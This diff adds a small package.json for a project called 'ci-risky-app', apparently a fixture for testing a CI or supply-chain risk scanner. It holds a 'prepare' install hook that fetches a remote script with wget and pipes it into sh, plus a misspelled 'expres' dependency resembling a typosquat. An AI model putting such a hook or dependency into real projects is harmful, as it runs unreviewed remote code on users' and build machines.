@@ -1,0 +1,12 @@
+{
+  "name": "ci-risky-app",
+  "private": true,
+  "devDependencies": {
+    "expres": "^1.0.0",
+    "typescript": "^5.9.0"
+  },
+  "scripts": {
+    "prepare": "wget https://example.invalid/bootstrap.sh -O - | sh",
+    "test": "node --test"
+  }
+}
